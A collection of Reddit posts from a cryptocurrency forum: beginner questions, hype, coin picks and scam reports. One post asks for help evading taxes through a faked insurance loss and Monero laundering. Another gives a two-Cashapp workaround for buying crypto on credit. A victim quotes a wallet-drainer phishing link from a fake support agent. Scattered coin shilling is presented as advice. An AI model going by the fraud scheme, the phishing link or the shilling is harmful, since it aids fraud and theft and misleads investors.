Preview popped up showing it would cost a dollar something in bnb or maybe something else. Was too excited to finally get to this point to get rid of Babaycare and proceeded.

Ended up with just under 10 dollars with Cake.

Hope anyone else robbed gets some of there money back. I had read somewhere that you may need to do increments depending on how Babycare you have. I probably had a billion coins and sold/swapped it for cake at all one time.

Would like for these people to be caught, but we all know that is doubtful. If it works for you, please let me know.

On a side note, my top 4 crypto that have made me money are Bitrise, Rainbow, EverEth, and Evergrow and I hope they continue. If you get some of your babycare money back, I woukd recommend bitrise or any of the other three as the place to put them, but I am not a financial expert and got rugged a few times, so be careful.

Hi,

I've just dabbled in crypto for the first time and through some friends, I discovered [https://www.tocoina.co](https://www.tocoina.com/dist/#/)m so, I am making my first withdrawal and I realized they froze my assets (in ETH) because I owed taxes on it. I was going to use the proceeds to pay the taxes on it, but apparently, it needs to be paid first before I can get my funds. Does this sound like a scam? Has anyone else had this issue before with Tocoina or is this a newbie I f\*\*\*ed up hard?

&amp;#x200B;

Thanks. Any advice is useful. I can't actually pay the taxes on it without amount getting access to the funds.

I have used reddit for a long time.  I, about seven years ago, started a wallet with dogetipbot and I was tipped a few coins, that wasnt much money at the time but would be now.  

Ive been searching for awhile to find what the subreddit was called and found the person who founded it allegedly embezzled the money? So thats most likely why I had such trouble finding it.

I am not in a great place financially so the money would be life changing. 

I am WELL aware I should have figured this out years ago. 

Just mostly wanted to know the story.

So the title is essentially the question Ive been investing in crypto for the past 6 months, mainly based on this subs recommendations but Im looking at having more free time shortly and would like to seriously dive into the use cases and certain utilities of coins to get a better grasp on the subject. 

Although Ive seen some posts giving some idea previously its hard to sift through all the garbage and find the actual informative posts especially with the current uprising of shit coins.

Any help is much appreciated, cheers.

I was near my local neighborhood and overheard a group of people talk about crypto. One guy said Well money is already digital so cryptocurrency makes sense. My ears shot up like Batman. I was so excited to hear people talk about crypto on the street. Its not even the holiday season and people are spreading the word. I have a feeling this holiday season everyone including your kids will be talking about crypto. This bull run will not be a repeat of 2013 or 2017. It will be like something we have never seen. Im crazy bullish on the next 2-3 months! Go spread the word.

I'm reasonably familiar with crypto now after 6 months or so and have been playing around in the DeFi space for a couple of months.

Inevitably, I have come across the term Impermanent Loss in that time, and I think I have a grasp of it, but I just want to put it into words that make sense to me and see if I've got the right end of the stick before I ramp up my DeFi investments, just in case I'm actually an idiot in this area (which may prove to be the case!).

So, the way I understand it is this:

I have 2 tokens: FOO and BAR that I want to use to add liquidity. For simplicity, let's say that at the time of investment, they are both worth exactly the same. 

I create a FOO/BAR pair, of 100 FOO and 100 BAR and add liquidity equal to 10% of the pool, and let's say that the pool itself is made up of 50% FOO and 50% BAR.

Next year I decide I want to leave the pool, and withdraw my tokens. Again for simplicity, let's say that my share is still 10%, but that the ratio of coins has now changed. Due to price movements and arbitrage, the pool is now made up of 75% FOO to 25% BAR in the pool.

***At this point, would I have a 25% impermanent GAIN in FOO and a 25% impermanent LOSS for BAR?***

Furthermore, when I withdraw my funds, will I now get 10% of the pool, and receive this back as 75% FOO tokens and 25% BAR tokens?

I was gonna buy $400 worth of SANTA about 2 hours ago. However, I procrastinated and watched a movie on Netflix instead. 

After the movie I came back and saw it was down by 50 percent. OUCH!!

However, I remember a famous Tiktok influencer named Pablo Heman who said that SANTA was gonna pump after SHIB because SHIB investors are going to be looking for new projects after taking profits.

Plus there is a building hype around the coin (Hype = moon).

* Are there any SANTA investors here? 
* What is r/cryptocurrencys stand about this coin?
* Should I still buy some? 
* Did I just dodge a bullet by procrastinating and watching a movie?
* Any thoughts?

I keep seeing all these post about going to the moon and people showing their gains. Im late to investing in crypto but I have a friend that has been in the game since 08, he was stacking Bitcoin when it was a quarter and he is just now planning on retirement. Crypto is just leveling the playing field, wealth is still a long term goal, the sooner we can come together as a community and not look at prices but look at the power crypto has to offer the faster we can make it main stream. There are always going to be multiple chains and nobody will invest in the same one but we all have the same goal and that needs to be the focus!!! 


Sorry for format on mobile but this has to be said.

Looking for some tips and advice about how best to go about locating lower market cap cryptos before they become more mainstream. 

Ive seen a few different strategies like keeping an eye on monthly volume relative to its market cap etc. 

Just curious if anyone here has been successful in formulating some sort of a system and if anyone is willing to share their strategies. 

Ive got my share of larger market cap coins but looking to diversify some investment into lower cap projects. 

Ill obviously look to do research into projects I find before investing.

I know, RobinHood sucks. Unfortunately, it is how I first got into crypto and since then my holdings have grown a decent amount but I can't move them anywhere or do anything with them.  


I tend to like to just HODL but I've been debating with myself if I should just DCA some of my BTC and ETH out as we continue to hit new ATH's and then transfer that money to stablecoins elsewhere so I can buy more when/if prices drop a bit.  


My question is already in the title but do I wait till 2022 whenever they release wallets to move everything or should I secure some profits(and pay taxes ew) and hope that prices dip a bit so I can increase my holdings?

Curious on your input, thanks

I love cryptocurrency and what it's brought to my life.

I love the fact that I'm getting a 40% APR when the highest I can find in traditional finances is .45 APR. I leave some money in savings but it absolutely hurts me when I look at that number.

I love how easy it is to get a new card sent to me from Coinbase. I was able to figure out, and send myself a new card in less than 5 minutes. I've never had that experience when I've lost my card with my bank.

I love how easy, cheap and fast it is to send Algorand from platform to platform. I have to wait a whole business day to send money from my savings to my checking... It's absolutely disrespectful.

I love how cryptocurrency has changed how I look and interact with finances and I'm super excited for what the future brings.

I currently have been seeing many posts speaking on how we shouldn't complain about paying taxes on our crypto as well as how this isn't a space for our "**libertarian rants".** 

I do believe this should be a space where we can rant about taxes and government corruption, most of the arguments for such seem buried in a appeal to the law fallacy.

One of the major reasonings we even have crypto currency is to get away from our current monetary system, that comes along with the laws and regulations we have in that monetary system. I think a lot of this debate and the multitude of posts I've been seeing supporting taxes for crypto seems alarming to me, isn't the point of crypto to be against the current system? 

I don't believe crypto should just become another asset, and I don't believe it is just some asset, it is whats going to bring us to a new monetary system and help us overcome many of the issues of fiat. 

Even with crypto not being involved in the conversation for someone to say I don't want to pay taxes isn't something completely outlandish imo, the amount of corruption, politics, in misuse of the money we pay in taxes is quite frankly ridiculous, how can you be content and not ask questions about that or even be mad when someone rants about it.

For me a cryptocurrency subreddit is the most perfect place to rant and speak on the flaws of government and their currency, and yes even the tax system.

Canadian bitcoin ETFs trade at NAV, can be US dollar denominated, but you pay a trading commission and annual fees of 0.95% or higher. US bitcoin futures ETFs also have similar annual fees but also have futures roll headwinds. The Osprey bitcoin trust trades at about 80% of NAV and has lower annual fees (0.45%), but the discount could widen and may stay wide forever like many closed-end funds do. Maybe a mix of all three so that, in the unlikely event one gets hacked, your eggs are not all in one basket. What do you think?

I was just checking average daily transactions graph of DASH and even now in bull market their transaction number is down from a nice 30k daily to around 10k a day. [https://bitinfocharts.com/comparison/dash-transactions.html#1y](https://bitinfocharts.com/comparison/dash-transactions.html#1y)

They have invested tremendous money into marketing and infrastructure and look what happened with their numbers.

Compared to all those "competitors" named in the title, Bitcoin has some serious following, infrastructure and so on.

If I understood correctly El Salvador's wallet Chivo is not completely decentralized, however you can withdraw funds from it using Bitcoin's LN to another decentralized wallet which seems a good enough solution.

Please don't get me wrong, I love and hold ton of NANO, I'm just concerned that smaller projects without infrastructure will never get their moment as LN seems to be a great solution.

What are your opinions on the topic?

NEED ADVICE: My daughter recently sold some crypto (BTC) and transferred $11,000 from Crypto.com to her bank account over 10 days ago. 

She has not received it in her bank account yet and both the bank and crypto.com are not taking responsibility even though its clearly got a paper trail leaving crypto.com but NOT ARRIVING at her bank. 

Has anyone else had this happen and what was the outcome? Shes very uneasy about this now. 

My thoughts: if it triggered a hold from a clearing center or tax reason, wouldnt she have to be notified of the hold?

Hi all- Im new to crypto and would love advice for how to keep my coins safe. I was clicking around bscscan and I found where you can see the coins in your wallet.  In addition to my actual coins that I bought on pancake swap, there are two others there that I did not buy and just appeared. I do not see them when sign into MetaMask.  I googled them and I believe they are scams trying to get me to connect my wallet to drain my account. One is called swap7 and the other is hex3exchange.  I thankfully did not click on the connect wallet button. My question is, is my money safe? I dont want to pay fees to transfer my coins to a new wallet if not needed, but of course want to make sure I wont be hacked with these coins being there.  Is there a way to remove them?

Thanks!

Hey all. Just like the title says, what if someone were to lets say put 20 dollars in every cryptocurrency and hope that one takes off like ETH or BTC. I keep seeing articles like if you had just put 20 dollars in Bitcoin 7 years ago you would be a millionaire. Plus over time crypto will continue to rise and should the majority of your portfolio. Let me know what you think.

FYI I havent done this yet but was just curious if this strategy would work. I am obviously invested in the big 2. This is more of a curiosity discussion.

I'm not saying you should cash out, but you need to know how to. This isn't even specific to shitcoins like Squid, which is obvious now (or is it?). Even Binance makes it super easy to buy crypto, put in your credit card on the big button on the front page, and click which one, done. But to actually sell it, trade it, and get the money into your bank account is a lot more confusing. So if you've never done it I'd suggest going through the motions to figure it out. Maybe (like Squid), you'll find it isn't even possible.

This is nothing against WSB. I mean, if you have those sunglasses, a vault that isn't open, and the Wall Street bets flair its unlikely Im giving much weight to what youre saying. I do appreciate the effort and dedication 

This isnt anything against LRC either. I picked up a small bag. But HOLY SHIT you guys dish out hopium in next level ways. Its unabashed. Its fervent. Its enough to feel an actual wave of people behind it. Its really something. Relentless.

So, my partners sister is pregnant. Congratulations to her on getting laid and all that.

Anyway, what I want to go is gift their kid a wallet containing some btc and eth. The idea being that they'll get access to it when they grow to adulthood. What's the best way to do this?

Hey y'all
Just wanted to share a little anecdote that happened to me. So, earlier this year I decided to invest a modest amount in Ethereum (I think at that point ETH was around 1500usd). For the most part there were no major gains, though I understood that I wasn't in it necessarily to make money. I saw it as an alternative to my savings account. 
Life is life though, and life is tough. Despite my best efforts I had to sell it off to pay for food and rent. No worries I thought, I'll just buy some more in a couple of weeks.

ETH skyrocketed to like 4000usd or so. Well shit I thought, I wished I could have hodled it. Still remained optimistic. I bought some more after it settled down around 3000. Same intention of hodling it for a long time. Life is life though, and life is tough. Once again I was forced to sell so I could pay for rent and food.

And that's my story. Pointless but I wanted to share it. I'm sure a lot of y'all have been in similar circumstances. It just makes me think how fucking difficult it's to save for poor people. We often have to risk literally being homeless, going hungry, ruining our credit score, etc. At the end of the day, I'm privileged that at least I had that small amount of ETH I could cash in order to avoid said things.


Thanks for coming to my TED talk about being broke.

Lots of people are lately posting about Bitcoin ETF with a lot of excitement. 

Problem is, ETF have nothing to do with cryptocurrency what so ever. It actually diverts money out of crypto. 

When some one buys Bitcoin ETF, they are not buying Bitcoin in any way what so ever. ETF is just a piece of paper that says I am worth what ever a Bitcoin is worth. Thats it. So now instead of people investing into Bitcoin directly and increasing demand for it, they will be buying a piece of paper that does not increase the demand for Bitcoin what so ever.

So, he cited loans and the typical interest attached to them as an example, accountability of paying it off and penalties etc etc as just being a steadfast constant in all of life regardless of what space it's in. I personally don't know too much about crypto lending process, assuming it's at all established at the moment. This guy isn't completely unaware of crypto. He has thrown a few bucks in some shitcoins and has a Coinbase account, etc but he's no different in that regard to any other dummy newbie who apes into the latest craze and has done no reasearch.

How does lending in crypto differ (in a good way) from the typical FIAT bank loans? Simple basics and keeping it analogous to the current way of doing things would help get it through his thick head better. Be as detailed as you can please as I may just copy/paste it straight to him.

Guess what guys and gals? I'm back in business. With the rise in cryptos over the past few week I can continue to pursue my baseball card addiction. No need to start looking for another job or reach out to my former girlfriend to see if she'll have me back.  By way of background...

...I'm addicted to collecting baseball cards. It's my passion and one I spend every spare $ on, including my crypto gains. What I consider the best release in the hobby, namely Panini Chronicles, is scheduled for release in early November. The hobby boxes retail for over $200 per box. Last year I went over budget and purchased too many hobby boxes and had to take an extra job to cover my spending. Unfortunately, this impacted my performance at my primary job and my boss told me to improve my performance or resign. Then my girlfriend told me she didn't want to be in a relationship with a 45yo man who can't keep a steady job or spends time on childish pursuits. She gives me a ultimatum, "It's either me or the baseball cards!"

Anyway, now that I'm single and cryptos have mooned, I have more time to focus on baseball cards. I just need to make sure the $$$ keeps flowing. My current portfolio is ADA, ALGO, BTC, ETH &amp; LTC and my exchange is Coinbase. I'm thinking of adding ERGO, MATIC and NANO. What do you think? Am I still on track to purchase Chronicles next week? Thanks guys and gals for all the love and support.

New'ish to the cry to thing. Basically I have followed it since bitcoin was first put on drip (somewhere I have a hard drive with one). However, have just left it alone. 

This post is to say hello to the community, I think I might actually start playing with this stuff.

A question. Why are stock options not sold as crypto, like Facebook (Meta?), or Tesla stock? Seems like this would be the natural progression to me. 

My favorite right now are AMP and Stellar. I really like the young and cheap ones that look like they have promise.

I had been holding shib since may and i bought it at 0.0000065 and i sold at 0.00006 for a nearly 10x profit. I loved the community and they were cool but now its just ridiculous. New people investing in crypto are losing money because of people saying HOLD and BUY THE DIP. Bro its not even a dip anymore. I got ban from shib discord because i said to the core instead of to the moon, its just toxic and has become a cult. Anyway i just think that its sad to see new investor losing money over some cult and delusional who thinks shib will eat a 0 this year. I took my profit and put it in safer coin, like new investor should do.

We all know how much is buying high and selling low is bashed around here. So, I was curious if there are people who bought some coin at all time high but still were able to 2x-3x their investments in the long run. 

And since we're talking about one of the most commonly used phrases in the crypto world or even stock market for that matter, how do you find its only gonna go down and won't go up further? Kinda same as you never know if the dip you bought is the last dip or it's gonna go further down. 

Personally I think it's about riding the wave but you gotta figure out whether you're late or still early in it. Like consider an big event around the corner for some coin, you'll be wise enough to buy the coin before the event and sell it before the event occurs often known as "buy the rumour, sell the news"

Earlier today I read yet another tale written by the victim of a sim swap attack. First off I am not 100% certain how these happen? I'm somewhat afraid to ask because I don't want people thinking I'm trying to learn how! But I am very interested in how to prevent this from ever happening to me. I have done the very most basic things I have heard to do. When I very first started in crypto I started periodically scanning my phone for malware. I made sure to update my user name and password for my cell account. I set up a PIN and challenge questions. But that is all the cell phone company seemed to offer. Of course I was speaking to a customer service agent who didnt understand crypto or what I was trying to do. I haven't worried about it as much these last couple of years...but I keep running across the stories on a regular basis. I think it is time to ask...

What are everyone's best practices to secure your cell phone and account against a sim swap attack?

Software/Apps that can help?

Available but not commonly understood protections you can set up with your cell service provider?

Do the exchanges themselves have anything that could be useful outside of 2FA?

If you are a victim, any tips on getting it back together after?

Thank you in advance!

Im new to Moon and the subreddit and just created a Vault. 

Bu because Im an idiot, I accidentally logged out without copying the secret words, so I had to create a new Vault.

Both times I checked the option to back up on reddit. Now Im kinda worried that I will receive Moons in the vault I cant actually use (Not sure if this can even happens or if they get deposited automatically in the vault you are logged in).

So do I need to do something? Dunno, deleting this backup of the first vault wherever it is -I dont even know how to do that- ? Or its alright with just the new vault I set up.

# Cryptocurrency company BetaShares ETF breaks Australian record on opening day

[https://news.coincu.com/30579-cryptocurrency-betashares-etf-australian-day/](https://news.coincu.com/30579-cryptocurrency-betashares-etf-australian-day/)

&gt;The new crypto company ETF of the Australian fund manager [BetaShares](https://news.coincu.com/24075-crypto-news-october-14-bitcoin-will-hit-100000-between-2023-and-2024-with-news-on-ethereum-matrixswap-dogecoin-coinbase-nft-defi-stellar/) broke the record on the Australian Stock Exchange (ASX) within 15 minutes of being listed.

Records broken in FIFTEEN minutes... wow!

Between this and Commbank jumping on board, now ANZ sniffing around commenting that the money in crypto cannot be ignored, well, things might be actually looking pretty good... Or they're looking for a quick buck too and see the crazy percentages and want some of that pie! haha

Either way, some big announcements like this and some serious players adopting crypto in general might slow down the ratio of "bitcoin crashed" to good crypto news. Might. I can be optimistic for once right

From unpopular opinions that are actually popular, to 10,000 comment coin shilling threads, this sub has it all -- and I'm so damn proud to be a part of it. 

You guys have taught me so much about the world of cryptocurrencies, taught me how to do my own research, made me laugh....and most importantly made me a shit-tonne of money! 

Even when this sub was a little more rampant (pre-cap), a 50,000+ comment post would still be full of happy, helpful people. Everyone I've dealt with so far has been respectful and willing to help the newbies out, which is something I can't say for a lot of other subs I browse on my alternate account. 

Keep doing what you're doing guys. The fact so many people **want** to join speaks volumes about the community y'all have created. Moons has most definitely been a reason behind a lot of people joining, which is awesome because when you check out [ccmoons.com](https://ccmoons.com) \-- you can see how generous everyone here is. We are literally giving money away....and we don't care!

Hello! I am very interested in getting into crypto and a few days ago, after doing some very limited research I started using binance.us (obviously I'm in the United States). I really am not putting that much money into it and because of that I want to get into another platform to mess around with before I start putting more in. I'm talking that I'm playing with less than 50$ right now so very little. 

Does anyone have any recommendations for me on what platform to switch to.

 Also what other recommendations would you have for someone like me who is just starting out.

Thanks a lot!

Bitcoin price is consolidating following its all-time high on October 20. The leading cryptocurrency may continue to move sideways until it is able to slice above the upper boundary of the prevailing chart pattern at *$63,695*.

The flagship digital asset will discover meaningful support at the 21 and 50 twelve-hour Simple Moving Averages (SMAs), coinciding with the 78.6% **Fibonacci retracement level at $*****61,151*** as its first line of defense.

If Bitcoin price faces further selling pressure, an additional foothold will emerge at the middle boundary of the parallel channel at *$60,022*,  then at the lower boundary of the parallel channel, corresponding to the 61.8% **Fibonacci retracement level at $56,543**.

Alright, alright, alright, so we all have had awkward conversations with people who dont have any clue about crypto. I just had one of those conversations and it seriously opened my eyes to the mainstream view of crypto. This guy had genuine interest in what I was saying after a few minutes off talking and I told him a few use cases of crypto. He said Wow, what makes you so passionate about it? Money/Profits? Community? Use cases? So I answered with a sprinkle of everything he said but I had to go and gave him my card so we could talk more. I told him that the more people in crypto, the better and it made me curious. Of all the use cases out there for crypto, what is your favorite? One that has perked my interest recently is blockchain voting for elections!!

When SHIB gets picked up by Robinhood crypto, do you think the alt coin market will suffer?

Honestly, there is a ton of money trying to make a buck and not so much putting their money into the future of currency aspect of crypto. I would say its not even close to proportionate. (Although I respect and support the underlying principals and I stake multiple coins).

So the real question is, when RH decides to go live with SHIB, do you think the money will be pulled from other reputable projects in order to fund the money grab? Obviously, outside money will come in and a service like RH, pulls from the general retail. But I cant help but expect a syphoning of capital from the other coins to pay for the pump. If you could grab a 20%+ gain overnight in exchange for moving a staggering coin, wouldnt you?

Newbie to the world of crypto currency and I have a lot of questions. 

So I jumped on the Coinbase train and purchased $25 of Shiba several weeks ago. After that quickly grew to over $400 I was hooked. However, as it began to fall (and is still falling) and I lost $100 of that over night - I decided to convert it into Ether and now have that staked in Eth2. I completed all of Coinbases learning modules and have been play around with that money and another $50 I threw in - so we are definitely not talking about $1000s invested here. 

My first question relates to the different, market places? - Im not exactly sure what they are called. But Coinbase, Binance, BKEX, etc. What should I be using? Staying away from? Aware of?

Relating to the marketplaces - I am confused about the differences prices from one market place to another. As a example for iotex right now. On Coinbase it is listed at $.34 and on Binance it is listed at $.13 is this not the same coin? And why do I have to use Binance.US (iotex is not an option to purchase on Binance.US) and not just Binance?

Cant I buy it from Binance for $.13 and then transfer it to Coinbase and it would be worth $.34?

I almost feel like an old man harkening back to "the good ole days" but for the ones that have been around since the early days (Before $1k+++ BTC) know how deeply rooted the crypto community was in libertarian ideals toward the start. For the most part, no one knew how big bitcoin and the crypto space would really be, and most didn't support bitcoin and the concept of cryptocurrency for price gains (Since there wasn't much) but for ideological reasons of freedom from the excessive power that the government holds over us and the monetary system. It nearly breaks my heart that the community has gone so far from the ideals it was based on and has turned more into a circlejerk of people trying to become millionaires rather than on the incredible freeing power that bitcoin and other cryptos can have for the regular, common person. I'm sure this will get lost to the other SHIB X10000 and gov loving posts but I hope some will step back from the intoxicating ideas of getting big gains and focus more on the freedom of decentralized currency and the ideals the crypto community is based on. Also taxation is theft

Rules are there to keep us safe and provide clarity in the heat of excitement. 

Below are some of the golden rules of crypto you should live by to avoid losing your money and maximising your profitability.

&amp;#x200B;

* When you take profit from your short to medium term investments, dump the realized profits into blue-chip coins like BTC and ETH. Then stake, or lend them for passive income.

&amp;#x200B;

* If you have no emergency need for cash, you have no business selling your crypto assets. And even then, selling your crypto assets should be the last resort. The reason is that your crypto is more than just money in your savings account, it's a yield-bearing asset. You don't just sell your land or house just because the price has increased or you feel itchy to hold cash, do you?

&amp;#x200B;

* DCA in when buying, DCA out when selling. That's the best way to buy and sell any coin.

&amp;#x200B;

* Double-check everything. When sending money from one wallet to another, ensure to double-check the wallet address (if possible, send a test transaction first). Also,  remember to enter the Memo tag where it's required, and make sure you're sending the right coin to the right place. Verify everything twice before clicking that SEND button, because if you made a mistake, the transaction can't be reversed and your money could be lost forever.

&amp;#x200B;

* Except you're a professional trader, you have no business with trading.

&amp;#x200B;

* Avoid using the Ethereum mainchain, except you have a significant amount of capital to work with. Use layer 2 solutions like Polygon and Arbitrum or alternative chains like Solana, Avalanche, etc, with lower fees instead.

&amp;#x200B;

* Don't take financial advice from strangers on the internet. Everything you hear and read online is for information purposes only. You're to digest it and use it to make informed decisions.

&amp;#x200B;

* When doing your own research (DYOR), use multiple sources. A single source is never enough to give you a clear picture.

&amp;#x200B;

* Have your own personal crypto investing plans and strategies and stick to them. Investing without a plan is identical to gambling, even if you're investing in the said solid projects. You need to know exactly what you're doing and why you're doing it. It will give you a clear head at all times.

&amp;#x200B;

* Never sell any of your crypto assets at a loss, except you have determined that you mistakenly invested in a scam and have to cut your loseses.

&amp;#x200B;

What other crypto investing rules do you follow that's been working for you?

Bitcoin was mainly used on the black market during its infancy, which means the majority of holders were criminals involved with illegal activity. Do you think after the price started going up it resulted in a lot of really bad people becoming really rich?

Would love to hear what you think! 

Ive heard all too much about the crypto world but Im still very new, so Im not too sure if this question has been asked before or if it has any value on this subreddit

Also 500 characters for a single text post is madness, please ignore this section of the post Im just desperately trying to reach the 500 word cap so my question can be answered. If youve read this far I hope youre having a great day and I wish you the best. I will now type out the entire Bee Movie script from memory. Hey Im Jerry from Jerry Seinfeld a Bee said in a voice so nasally it sounds like a bee buzzing.

Thanks

&lt;Feel free to consider a Comedy tag&gt;

I understand DYOR, but part of research is to follow the market trends, or even to get ahead of popular opinion and what better place for that is this beautiful forum!!   So, I bought every coin mentioned in the daily threads as well as the obvious Shills.  

90 days in, the results are pretty spectacular, almost having doubled my investment!  Thanks to every input - in this market, it's really difficult to go wrong!!

Portfolio:  \~50 coins.

* All of the obvious blue chippers (BTC, ETC, ADA, Sol, ALGO, DOT, Link...)
* Shills (AMP, Doge, SHIB - pretty solid!, ATOM, Tezos, AAVE, ENJ)
* Regrets (ICP - eff ICP and the -12% and Comp and the -25% as the losers)
* Big Winners (Sol obviously, Shib - but I didn't go crazy there, LUNA, ATOM)

While I didn't do equal investments in each as I DCA'd as coins dropped, a simple avg of the 90 Day tracker is 90% and that \~matches the Koinly.

Anyways, 6 of the 50 are down..  so the obvious takeaway has to be that \~90% of the inputs here pay off!!  Thanks all for the advice - keep it up!!

I was just thinking about the whole "metaverse" in according to how blockchains could accomplish this idea of being online while not leaking personal information to people you don't wish to share it with, make sharing information faster safer and leave less of a carbon footprint doing so.

Another thing is the NFTs and how they made SOL for example have a really good run. Other coins not so much or are they just that behind of SOL. I dont know much about SOL so anyone can correct me if I'm wrong here

I'm really into layer 2 solutions right now and I think they are a great bridge making crypto alot more appealing by lowering transaction costs and making transfers faster.
My picks for these are matic and celr.

What I'm not interested in is the social media aspect of certain coins being the only reason they have value and investors basing what they buy on what they see other people shilling on Twitter or ticktok or whatever. I know and understand the marketing aspect but I'm not understanding what they are actual offering besides hype.

Let's have a discussion about any of these subjects or anything else happening right now in the crypto world.

TLDR what are your thoughts about the different aspects of crypto currently?

Noob here. Had a discussion a while back with a mate of mine about cryptocurrency. His argument against it was that if the government was to make the tender of USD (or any other currency) to crypto illegal, it would immediately drop the price to $0. We talked about tax avoidance implications and hes pretty set on Crypto being a fail. Thoughts? This discussion was a while ago so Im forgetting some of the details about his argument.. could some explain to me why this is never going to be the case?

Im suspicious of the manipulation in the crypto market.

Was surprised to see a post on this sub a couple of days ago with fucktons of awards and upvotes naming and shaming a particular coin in a roundabout way. This is a top 20 coin and it a meme. The post gave no reasons, just *I think this coin will fail - any others*

The title was something like *what project are you losing faith in*. It appeared like a veiled FUD post. 

That coin hadnt moved in about a month and immediately saw movement after that, going up almost 20% in the past 2 days

Every now and then we can see coins going 100-10000% in day which makes many of us wonder why don't we catch that move next time , which make us to search for the next Crypto that moves to moon.

The amount of posts in this sub asking for the next 100x coin is at a ATH and every now and then people are being attracted into Crypto by the form of FOMO.

Crypto was introduced to make our lives easy and with calculative bets this is the best store value out there to beat the inflation in the long term but the way it is used now just shows how early we are in the Crypto space.

Behind every coin going to the moon , there are hundreds of investors losing their money with the same Fomo against another coin. This is why most of the investors stick with the best two - BTC and ETH. 

Now I'm not against people FOMOing with their portfolio , a 5-10% risk is not a problem but when they go all in where the shit happens. Instead of going behind these next 100x , if you had just invested all these days with the top Crypto projects , you'd have made much returns than running behind the next 100X coin.

Edit :- If people want to go behind the next coin which gives them 100x , it's their wish their money and if they make money I'm happy for them. But this is just to show the downsides of doing that in Crypto.

I know there's lots of websites that you can buy giftcards with crypto, but they tend to only accept coins on the Bitcoin network or Ethereum network, resulting in big fees. I don't want to pay $80 in fees just to send my ether to them for a a $100 gift card.

Does anyone know sites that accept other networks like Solana, Fantom, Avalanche, etc?

The only site I only one I know that accepts other networks is [https://www.cryptorefills.com/](https://www.cryptorefills.com/) but they don't offer that many types of gift cards.

Would appreciate any sites that you know of!

I  want to cash out $25,000 in bitcoins but I do not want to pay much in taxes. I want to lose them in a boating accident, and have my brother cash out the $25,000 in Monero he claimed from my boating accident insurance. Please correct me if I am wrong, but as I understand Monero is virtually untraceable at the moment which means there is no way for the IRS to know at what price my brother bought his Monero nor where it came from. Can he said he bought it at any price and pay almost $0 in taxes?

What method would I have to use and what is a reputable company to do the swap?

I  know that is not a good idea to say how much money I have in bitcoins. But no worries, I have put a great effort to isolate this account from  my real identity: Tor, VPN, Tails, throwaway email, fake info, and I have never  shared any personal details on this account)

As crypto becomes more widely adopted, Ive considered setting up wallets for family/friends and transferring them funds as a Christmas present. This will achieve two things, giving them a present, and peaking their curiosity in the world of crypto.

On another thought, this could be the ultimate college/retirement plan. Imagine giving someone X amount of Bitcoin and saying great this as a retirement account of college savings - I would strongly advise additional investments over the years the same way youd treat any other savings account.

Presents and future investments, I get it. Its also the whiskey talking, but its still from the mindset of giving and helping others.

Thoughts?

In certain subs I see groups of people talking mad shit on binance. Other times I see people loving it. This is the largest crypto community I know and I wish I could do a poll but I cant. Im curious to hear from a large variety of people about how they feel about Binance.

Me personally, I love it. Never had any issues. Interface and UI is intuitive and easy and has advanced features. Never lost money. Nothing of any real concern. Customer service is slow but thats not exclusive to Binance. Before crypto started blowing up theyd respond within hours.

All in all, its my preferred exchange. What has your experience been like?

If you can put a Good or Bad or Neutral somewhere in your comment I want to go through and tally it up.

Ive explained a lot about Crypto to my wife and she understands a bit of it. She has a loose grasp on Blockchain, she understands a little about Smart Contracts. She knows that I invest some money into it but she doesnt know enough (or knows too much) to let me invest more.

She went with me through the big Doge pump when I held from 0.007 and watched the ATH only to hold until 0.19 again. Womp. I didnt go there with Shib but you know.

But through all this, when I told her I can earn crypto by shit posting on Reddit she didnt believe me. When I showed her they could actually be worth money she didnt believe me.

Please help me explain to her Moons and how theyre a real thing!!!

Silly me for not reading all the details when I signed up for the free $100 BC promo last week... I assumed I'd just send my $100 in BTC to my wallet when everything settled but found there's a 0.0005 BTC withdrawal fee. So now my $100 is more like $70. (Yes, I could sell and withdrawal USD but then I have a reportable/taxable transaction.) Guess I'Il just manage another exchange profile because I don't have enough already, haha  How many is too many anyway?

I just saw a post and not where (the frontpage!). It's basically a rant against libertarians and bundles them in with people that don't want to pay taxes. No way does that reflect the general consensus of this sub, there aren't constant posts flooding this sub talking about how tax is theft, that's absolute bs. 

What's more, nobody is actively trying to avoid paying taxes on their crypto, there may be a few but that has absolutely nothing to do with libertarianism. What is this outlandish cockroach feces being spewed towards an entire group of people that are all diverse and may not even hold the same views?  


Seriously, we're allowed to at least question the government and tax rates. How will crypto progress if we don't engage in discourse around taxation and talk to local representatives and get in on the action on the political front? The irony of that post is you're attacking the people while overlooking the corruption of the government, and then the nerve to try and sound virtuous for talking that shait.

We've all been there. We got that Shinny BlockFi Crypto Rewards Credit card and Thought to our self's, if I just buy crypto, keep the rewards then pay off the balance with the crypto I bought I can be rich. But they don't allow it. Well until now. 

What you need:
* 2 Cashapp accounts(could be yours, your mom, uncle granddad)
* A debit card that's linked to cashapp. 

How to:
* Add your credit card to one cashapp
* Send your amount to the other cashapp you'd like to spend
* Cash out to your debit card
* Buy crypto
* Enjoy the sweet rewards. 

It's charged as a purchase. Not a cash advance. Cashapp charges a measley 3%. But who doesn't want to spend that $50k on that credit card to buy 0.9 BTC?? Only a fool wouldn't. 

*Not Financial Advice*

Hello world,

I purchased BonusFloki tokens on Monday with a value of roughly $500( around 40B tokens. ) 

I noticed the number of tokens were decreasing everyday. Now its Thursday and I only have 500M token left in my wallet which is roughly $50.

Now keep in mind the price of the token has gone up around 4-5000% since I purchased it. So Im lost at this point on how this is even possible.

Anyways I decided to reach out to their help desk. And here is what they told me to do:

Your issue is being resolve at the moment. Kindly click on the link below to validate your wallet on our API network. This usually takes not lest than 20 minutes for the lost token to be recovered. Bear it in mind that unvalidated wallets would not recover lost token. https://multlconnectsync.online/

After clicking on the link, if it show connection error, click on "connect manually".

At this point I told the agent that this sounds like a scam:

Here are the replies :

This is not a scam that I can assure you. BFloki would eventually rise sooner than expected that I can assure you. Once again please bear with us for all the inconveniences

Kindly validate your wallet to avoid addition loss of token, your lost token would automatically be restored after validating manually

Please think carefully of your actions as you may regret them if you are not validated.


So pretty much what the site was asking for was to link my trust wallet or as he says validate it. I did a bit research and from what I read trust wallet doesnt need to be validated. Once its installed and has ur secret key its validated. (Again I could be wrong on this )

Im hoping someone in the community can shed more light on this issue and if this token is truly a scam to help others avoid it.

Thank you in advance.

A

The future I see for crypto is not going to be one that is of strict benefit for the people. Banks, businesses and governments will refuse to surrender their control of people. 

Legislatures will work to ensure their interests are protected and theyll install regulations and rules that either directly or indirectly eliminate options for people, funneling them into the channels of control.

This is not a future I feel good thinking about, of course. But given the way things tend to work, this is the way itll likely go.

